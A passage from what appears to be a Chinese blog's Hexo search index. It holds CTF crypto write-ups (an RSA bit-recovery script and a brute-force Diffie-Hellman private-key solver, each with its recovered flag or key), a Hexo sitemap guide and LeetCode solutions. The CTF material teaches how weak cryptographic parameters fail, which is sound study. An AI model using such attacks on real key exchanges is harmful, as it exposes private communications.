ans.append(str(b))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 都右移看下一位</span></span><br><span class="line">        m_or_x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        m_and_x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        x &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    ans = ans[::<span class="number">-1</span>]</span><br><span class="line">    ans = <span class="string">""</span>.join(ans)</span><br><span class="line">    <span class="keyword">return</span> libnum.n2s(int(<span class="string">'0b'</span>+ans,<span class="number">2</span>))</span><br><span class="line">m_or_x=<span class="number">2722393138562666557007231734043804673010965247853655886232567981247025605356740318867235245940388712958024648376448739432029199788029</span></span><br><span class="line"><span class="comment"># m_and_x为m|x低440位</span></span><br><span class="line">m_and_x = <span class="number">947571396785487533546146461810836349016633316292485079213681708490477178328756478620234135446017364353903883460574081324427546739724</span></span><br><span class="line">x = <span class="number">15581107453382746363421172426030468550126181195076252322042322859748260918197659408344673747013982937921433767135271108413165955808652424700637809308565928462367274272294975755415573706749109706624868830430686443947948537923430882747239965780990192617072654390726447304728671150888061906213977961981340995242772304458476566590730032592047868074968609272272687908019911741096824092090512588043445300077973100189180460193467125092550001098696240395535375456357081981657552860000358049631730893603020057137233513015505547751597823505590900290756694837641762534009330797696018713622218806608741753325137365900124739257740</span></span><br><span class="line">m=recover(x,m_and_x,m_or_x)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><pre><code>utflag{C0u1dNt_c0m3_uP_w1tH_A_Cl3veR_f1aG_b61a2defc55f}</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://github.com/cscosu/ctf-writeups/tree/master/2021/utctf/A_Bit_Weird" target="_blank" rel="noopener">https://github.com/cscosu/ctf-writeups/tree/master/2021/utctf/A_Bit_Weird</a></p></li><li><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 密码学 </tag>
            
            <tag> Crypto-CTF </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Crypto-CTF】Diffie-Hellman(DH)密钥交换</title>
      <link href="2021/03/16/Crypto-02-Diffie-Hellman%EF%BC%88DH%EF%BC%89%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2/"/>
      <url>2021/03/16/Crypto-02-Diffie-Hellman%EF%BC%88DH%EF%BC%89%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：简要介绍Diffie-Hellman密钥交换基本原理，所存在的中间人攻击，以及UCTF2021比赛中关于DH的Small p Problems暴力破解题</p><a id="more"></a><h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p>Diffie-Hellman密钥交换是一种在公共通道上安全交换加密密钥的方法，该公共通道相较传统意义两方加密通信需先通过物理安全通道有较大不同，也即此通道运行通过<strong>不安全通道</strong>共同建立<strong>共享密钥</strong>。</p><p>DH可广泛应用于保护各种Internet服务，比如DH-RSA算法组合应用于TLS协议中。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>采用wiki上一张图形象解释：</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210316dh01.png" width="300px"><ul><li>step1：Alice和Bob共同选择公开的颜色(图中黄色)</li><li>step2：Alice和Bob各自选择自己的秘密颜色（黄色：蓝绿色）</li><li>step3：Alice和Bob各自将公开颜色和自己秘密颜色混合形成各自即将交换的颜色（橙色棕褐色：浅蓝色）</li><li>step4：最后，Alice和Bob再将从对方收到颜色和自己秘密颜色混合，得到最终配色（黄棕色），此配色也即共享的密钥</li></ul><p>如果第三方监听到，交换信息，由于不知道各自的秘密颜色，无法获取共享密钥</p><p><strong>密码学解释</strong></p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210316dh02.png" width="600px"><p>选择素数p及其本原根g，是为了确保共享密钥在1到p-1之间</p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>DH密钥交换的安全性建立在以下事实：</p><blockquote><ul><li>计算素数模幂相对容易（$g^a mod p$称为模幂）</li><li>对于大素数p，求其离散对数被认为是困难的</li></ul></blockquote><p>当p为600位以上的质数时，不知私钥a和b时是很难解出a的。</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>由于DH密钥交换本身不提供通信方的身份验证，因此容易受到中间人攻击。</p><p>也即中间人分别和Alice和Bob构建共享密钥K1和K2</p><ul><li>中间人可以查看消息并转发两者消息</li><li>中间人可以修改消息转发给另一人</li></ul><p>更多信息可参考：<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange</a></p><h2 id="UCTF2021-Small-p-Problems"><a href="#UCTF2021-Small-p-Problems" class="headerlink" title="UCTF2021-Small p Problems"></a>UCTF2021-Small p Problems</h2><p>示例通过一道CTF题，来反映在DH密钥交换中，p选择素数较小，使用暴力破解便可获取共享密钥的过程</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>My buddies Whitfield and Martin were trying to share a secret key between themselves, and I was able to eavesdrop on their conversation. I bet I could probably figure out their shared secret with a little math…</p><pre><code>p = 69691g = 1001A = 17016B = 47643</code></pre><p>Note: submit either the shared secret or the shared secret wrapped in utflag{}</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>根据题目，无法得知各自私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">69691</span></span><br><span class="line">g=<span class="number">1001</span></span><br><span class="line">A=<span class="number">17016</span></span><br><span class="line">B=<span class="number">47643</span></span><br><span class="line"><span class="comment"># 暴力破解a或者b ,范围从1-p-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,p):</span><br><span class="line">    <span class="keyword">if</span> pow(g,i,p)==A: <span class="comment"># 若满足g^i mod p = A，则说明i为A的私钥a</span></span><br><span class="line">        print(<span class="string">"a:"</span>,i,<span class="string">"\nK:"</span>,pow(B,i,p))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><pre><code>a: 12552 K: 53919</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">69691</span></span><br><span class="line">g=<span class="number">1001</span></span><br><span class="line">A=<span class="number">17016</span></span><br><span class="line">B=<span class="number">47643</span></span><br><span class="line"><span class="comment"># 暴力破解a或者b ,范围从1-p-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,p):</span><br><span class="line">    <span class="keyword">if</span> pow(g,i,p)==B: <span class="comment"># 若满足g^i mod p = B，则说明i为B的私钥b</span></span><br><span class="line">        print(<span class="string">"b:"</span>,i,<span class="string">"\nK:"</span>,pow(A,i,p))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><pre><code>b: 7919 K: 53919</code></pre><p>所以，当p选取较小时，可以使用暴力破解方式得当各自私钥</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 密码学 </tag>
            
            <tag> Crypto-CTF </tag>
            
            <tag> 密钥交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【hexo】Hexo博客收录百度和谷歌</title>
      <link href="2021/03/15/Hexo-01-Hexo%E5%8D%9A%E5%AE%A2%E6%94%B6%E5%BD%95%E7%99%BE%E5%BA%A6%E5%92%8C%E8%B0%B7%E6%AD%8C/"/>
      <url>2021/03/15/Hexo-01-Hexo%E5%8D%9A%E5%AE%A2%E6%94%B6%E5%BD%95%E7%99%BE%E5%BA%A6%E5%92%8C%E8%B0%B7%E6%AD%8C/</url>
      
        <content type="html"><![CDATA[<p>本文博客搭建：hexo+github方式</p><a id="more"></a><h2 id="确定网站是否已经被收录"><a href="#确定网站是否已经被收录" class="headerlink" title="确定网站是否已经被收录"></a>确定网站是否已经被收录</h2><pre><code>site:你的网站</code></pre><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo01.png" alt=""></p><p>同样可测试是否被google收录</p><h2 id="安装扩展插件"><a href="#安装扩展插件" class="headerlink" title="安装扩展插件"></a>安装扩展插件</h2><p>站点地图是一种文件，您可以通过该文件列出您网站上的网页，从而将您网站内容的组织架构告知Google和其他搜索引擎。Googlebot等搜索引擎网页抓取工具会读取此文件，以便更加智能地抓取您的网站。</p><ul><li><p>在你的hexo博客根目录，用下面2个命令分别安装谷歌、百度所对应的站点地图生成文件</p><p>  npm install hexo-generator-sitemap –save<br>  npm install hexo-generator-baidu-sitemap –save</p></li></ul><p>若出现下列错误，<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo02.png" alt=""></p><p>直接删除该文件即可</p><ul><li>在博客目录的_config.yml中添加如下代码</li></ul><pre><code># 自动生成sitemap# sitemapsitemap:  path: sitemap.xmlbaidusitemap:  path: baidusitemap.xml</code></pre><ul><li><p>编译博客</p><p>  hexo g</p></li><li><p>然后你可以看到在你博客下的public目录下生成了sitemap.xml以及baidusitemap.xml文件，这样就大功告成了。sitemap.xml是提交给谷歌的、baidusitemap.xml是提交给百度的。</p></li><li><p>部署后你分别访问</p></li></ul><pre><code>https://fishni.github.io/sitemap.xmlhttps://fishni.github.io/baidusitemap.xml</code></pre><p>出现相关内容即证明成功</p><h2 id="验证网站所有权"><a href="#验证网站所有权" class="headerlink" title="验证网站所有权"></a>验证网站所有权</h2><p><a href="https://search.google.com/search-console/welcome?hl=zh-CN&utm_source=wmx&utm_medium=deprecation-pane&utm_content=home" target="_blank" rel="noopener">google搜索引擎站点入口</a></p><p><a href="http://www.baidu.com/search/url_submit.htm" target="_blank" rel="noopener">百度搜索引擎站点入口</a></p><pre><code>为什么要验证网站　　站长平台推荐站长添加主站（您网站的链接也许会使用www 和非 www 两种网址，建议添加用户能够真实访问到的网址），添加并验证后，可证明您是该域名的拥有者，可以快捷批量添加子站点，查看所有子站数据，无需再一一验证您的子站点。如何验证网站首先如果您的网站已使用了百度统计，您可以使用统计账号登录平台，或者绑定站长平台与百度统计账号，站长平台支持您批量导入百度统计中的站点，您不需要再对网站进行验证。百度站长平台为未使用百度统计的站点提供三种验证方式：文件验证、html标签验证、CNAME验证。1.文件验证：您需要下载验证文件，将文件上传至您的服务器，放置于域名根目录下。2.html标签验证：将html标签添加至网站首页html代码的标签与 标签之间。3.CNAME验证：您需要登录域名提供商或托管服务提供商的网站，添加新的DNS记录。验证完成后，我们将会认为您是网站的拥有者。为使您的网站一直保持验证通过的状态，请保留验证的文件、html标签或CNAME记录，我们会去定期检查验证记录。参考链接：https://www.jianshu.com/p/5e68f78c7791来源：简书</code></pre><h3 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h3><p>登录百度资源搜索平台<strong>用户中心 &gt; 站点管理，点击添加站点</strong></p><p><strong>站点领域</strong>随便填一下就好，然后选择文件验证验证你的网站</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo03.png" alt=""></p><ul><li><p>推荐文件验证，根据提示<strong>下载验证文件</strong>，将它拷贝到hexo/themes/next/source文件夹下</p></li><li><p>然后更新部署网站，在你的博客域名+/验证文件名看看你不能访问，例如我输入的是这个：</p><p>  <a href="https://fishni.github.io/baidu_verify_code-eX5Up440HK.html">https://fishni.github.io/baidu_verify_code-eX5Up440HK.html</a></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo04.png" alt=""></p><ul><li>验证后结果显示</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo05.png" alt=""></p><ul><li>多次尝试后进入下图页面</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo06.png" alt=""></p><p>等一段时间后，验证成功</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo07.png" alt=""></p><h4 id="推送设置"><a href="#推送设置" class="headerlink" title="推送设置"></a>推送设置</h4><ul><li><p>首先，安装hexo-baidu-url-submit插件</p><p>  npm install hexo-baidu-url-submit –save</p></li><li><p>在站点配置文件中添加baidu-url-submit的配置项，把以下内容配置到站点配置文件<code>_config.yml</code>中。</p></li></ul><pre><code>#设置百度主动推送baidu_url_submit:  count: 1  #比如1，代表提交最新的1个链接  host:  fishni.github.io/# 在百度站长平台中注册的域名，这个改为你自己的域名  token: your_token # 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!  path: baidu_urls.txt # 文本文档的地址， 新链接会保存在此文本文档里，这个默认</code></pre><p>这个秘钥可以从百度站长平台的普通收录那里获取到，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo08.png" alt=""></p><ul><li>在站点配置文件中加入新的deploy配置项</li></ul><p>同样在站点配置文件中找到deploy项，添加新的推送项，如下所示：</p><pre><code># Deploymentdeploy:- type: git  repository:    github: git@github.com:TRHX/TRHX.github.io.git  # 这是原来的 github 配置    coding: git@git.dev.tencent.com:TRHX/TRHX.git   # 这是原来的 coding 配置  branch: master- type: baidu_url_submitter                         # 这是新加的主动推送</code></pre><p>这里一直报错，网上搜了相关内容，全是成功的例子，我就不继续弄了</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo09.png" alt=""></p><h3 id="google"><a href="#google" class="headerlink" title="google"></a>google</h3><p>谷歌操作比较简单，就是向Google站长工具提交sitemap</p><p>登录Google账号，添加了站点验证通过后，选择添加网址前缀：<a href="https://fishni.github.io">https://fishni.github.io</a></p><p>完成验证后，选择站点，之后在索引——站点地图中就能看到添加/测试站点地图，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo10.png" alt=""></p><p>如图出现一些问题,这可能需要等待一段时间</p><p>通过site:fishni.github.io，验证是否被收录</p><p>经过一段时间，sitemap.xml</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210315hexo11.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【dfs+回溯】46.全排列</title>
      <link href="2021/03/12/LeetCode-H-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-46.%20%E5%85%A8%E6%8E%92%E5%88%97/"/>
      <url>2021/03/12/LeetCode-H-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-46.%20%E5%85%A8%E6%8E%92%E5%88%97/</url>
      
        <content type="html"><![CDATA[<p>深度优先搜索、回溯思想</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 没有重复数字的序列，返回其所有可能的全排列。</p><p>示例：</p><pre><code>输入: [1,2,3]输出:[  [1,2,3],  [1,3,2],  [2,1,3],  [2,3,1],  [3,1,2],  [3,2,1]]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(self, nums)</span>:</span><span class="comment"># nums: list[int] ,返回值：list[list[int]]</span></span><br><span class="line">        <span class="comment"># 定义路径列表，track</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        track=[]</span><br><span class="line">        res=[]</span><br><span class="line">        self.backtrack(nums,track,res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrack</span><span class="params">(self,nums,track,res)</span>:</span> <span class="comment"># 回溯实现</span></span><br><span class="line">        <span class="comment"># 如果track长度等于nums长度，即一种选择，放入res中</span></span><br><span class="line">        <span class="keyword">if</span> len(track)==len(nums):</span><br><span class="line">            res.append(track[:]) <span class="comment">#  变量track列表指向是地址，深度优先遍历完成以后，回到了根结点，成为空列表。所以这里做一个拷贝</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">            track.append(nums[i])</span><br><span class="line">            self.backtrack(nums,track,res)</span><br><span class="line">            track.pop()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    a = Solution()</span><br><span class="line">    print(a.permute(nums))</span><br></pre></td></tr></table></figure><pre><code>[[1, 2, 3], [1, 3, 2], [2, 1, 3], [2, 3, 1], [3, 1, 2], [3, 2, 1]]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> dfs、回溯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【搜索】695.岛屿的最大面积</title>
      <link href="2021/03/10/LeetCode-H-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-695.%20%E5%B2%9B%E5%B1%BF%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%A2%E7%A7%AF/"/>
      <url>2021/03/10/LeetCode-H-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-695.%20%E5%B2%9B%E5%B1%BF%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%A2%E7%A7%AF/</url>
      
        <content type="html"><![CDATA[<p>深度优先搜索、栈</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个包含了一些 0 和 1 的非空二维数组 grid 。</p><p>一个 岛屿 是由一些相邻的 1 (代表土地) 构成的组合，这里的「相邻」要求两个 1 必须在水平或者竖直方向上相邻。你可以假设 grid 的四个边缘都被 0（代表水）包围着。</p><p>找到给定的二维数组中最大的岛屿面积。(如果没有岛屿，则返回面积为 0）</p><p>示例：</p><pre><code>Input:[[1,0,1,1,0,1,0,1],[1,0,1,1,0,1,1,1],[0,0,0,0,0,0,0,1]]Output: 6最大的岛屿面积为 6，位于最右侧。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：深度优先搜索"><a href="#方法一：深度优先搜索" class="headerlink" title="方法一：深度优先搜索"></a>方法一：深度优先搜索</h3><ul><li>确定一块土地时，从四个方向考虑，为了避免每块土地多次计算，每次访问后将其赋值为0</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxAreaOfIsland</span><span class="params">(self,grid)</span>:</span><span class="comment"># grid :List[list[int]]</span></span><br><span class="line">        maxArea=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,l <span class="keyword">in</span> enumerate(grid):</span><br><span class="line">            <span class="keyword">for</span> j,n <span class="keyword">in</span> enumerate(l):</span><br><span class="line">                maxArea=max(self.dfs(grid,i,j),maxArea)</span><br><span class="line">        <span class="keyword">return</span> maxArea</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(self,grid,cur_i,cur_j)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cur_i&lt;<span class="number">0</span> <span class="keyword">or</span> cur_j&lt;<span class="number">0</span> <span class="keyword">or</span> cur_i==len(grid) <span class="keyword">or</span> cur_j==len(grid[<span class="number">0</span>]) <span class="keyword">or</span> grid[cur_i][cur_j]!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        grid[cur_i][cur_j]=<span class="number">0</span></span><br><span class="line">        ans=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> di,dj <span class="keyword">in</span> [[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">-1</span>],[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">-1</span>,<span class="number">0</span>]]:</span><br><span class="line">            next_i,next_j = cur_i+di,cur_j+dj</span><br><span class="line">            ans +=self.dfs(grid,next_i,next_j)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grid=[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">a = Solution()</span><br><span class="line">a.maxAreaOfIsland(grid)</span><br></pre></td></tr></table></figure><pre><code>6</code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>时间复杂度：O(R×C)。其中 R 是给定网格中的行数，C是列数。我们访问每个网格最多一次。</p><p>空间复杂度：O(R×C)。递归的深度最大可能是整个网格的大小，因此最大可能使用 O(R×C) 的栈空间。</p><h3 id="方法二：深度优先搜索-栈"><a href="#方法二：深度优先搜索-栈" class="headerlink" title="方法二：深度优先搜索 + 栈"></a>方法二：深度优先搜索 + 栈</h3><p>这种方法本质与方法一相同，唯一的区别是</p><ul><li>方法一通过函数的调用来表示接下来想要遍历哪些土地，让下一层函数来访问这些土地。而方法二把接下来想要遍历的土地放在栈里，然后在取出这些土地的时候访问它们。</li><li>访问每一片土地时，我们将对围绕它四个方向进行探索，找到还未访问的土地，加入到栈 stack 中；</li><li>另外，只要栈 stack 不为空，就说明我们还有土地待访问，那么就从栈中取出一个元素并访问。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxAreaOfIsland</span><span class="params">(self,grid)</span>:</span><span class="comment"># grid:List[List[int]]</span></span><br><span class="line">        maxArea=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(grid)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(grid[<span class="number">0</span>])):</span><br><span class="line">                curArea=<span class="number">0</span></span><br><span class="line">                stack = [(i,j)]</span><br><span class="line">                <span class="keyword">while</span> stack:</span><br><span class="line">                    cur_i,cur_j=stack.pop()</span><br><span class="line">                    <span class="keyword">if</span> cur_i&lt;<span class="number">0</span> <span class="keyword">or</span> cur_j&lt;<span class="number">0</span> <span class="keyword">or</span> cur_i==len(grid) <span class="keyword">or</span> cur_j==len(grid[<span class="number">0</span>]) <span class="keyword">or</span> grid[cur_i][cur_j]!=<span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    curArea+=<span class="number">1</span></span><br><span class="line">                    grid[cur_i][cur_j]=<span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> di,dj <span class="keyword">in</span> [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">-1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">-1</span>]]:</span><br><span class="line">                        next_i,next_j=cur_i+di,cur_j+dj</span><br><span class="line">                        stack.append((next_i,next_j))</span><br><span class="line">                maxArea=max(curArea,maxArea)</span><br><span class="line">        <span class="keyword">return</span> maxArea</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grid=[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">a = Solution()</span><br><span class="line">a.maxAreaOfIsland(grid)</span><br></pre></td></tr></table></figure><pre><code>6</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 搜索 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【排序】347.前K个高频元素</title>
      <link href="2021/03/05/LeetCode-G-%E6%8E%92%E5%BA%8F-347.%20%E5%89%8D%20K%20%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0/"/>
      <url>2021/03/05/LeetCode-G-%E6%8E%92%E5%BA%8F-347.%20%E5%89%8D%20K%20%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>桶排序</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空的整数数组，返回其中出现频率前 k 高的元素。</p><p>示例1：</p><pre><code>输入: nums = [1,1,1,2,2,3], k = 2输出: [1,2]</code></pre><p>示例2：</p><pre><code>输入: nums = [1], k = 1输出: [1]</code></pre><p>提示：</p><pre><code>你可以假设给定的 k 总是合理的，且 1 ≤ k ≤ 数组中不相同的元素的个数。你的算法的时间复杂度必须优于 O(n log n) , n 是数组的大小。题目数据保证答案唯一，换句话说，数组中前 k 个高频元素的集合是唯一的。你可以按任意顺序返回答案。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>桶排序思路：</p><ul><li>统计各数出现的频次</li><li>以频次为索引建立对应的数的集合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td 